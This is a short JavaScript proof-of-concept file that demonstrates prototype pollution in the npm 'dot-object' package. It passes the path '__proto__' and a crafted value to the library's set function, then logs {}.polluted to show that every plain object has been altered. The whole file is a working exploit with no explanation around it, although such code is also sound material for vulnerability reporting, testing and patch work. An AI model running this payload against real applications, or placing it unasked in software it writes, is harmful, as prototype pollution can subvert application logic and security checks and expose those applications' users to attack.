var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var a = require('dot-object');
var obj = {};
var path = '__proto__';
console.log({}.polluted);
var val = { polluted: 'yes' };
a.set(path, val, obj, true);
console.log({}.polluted);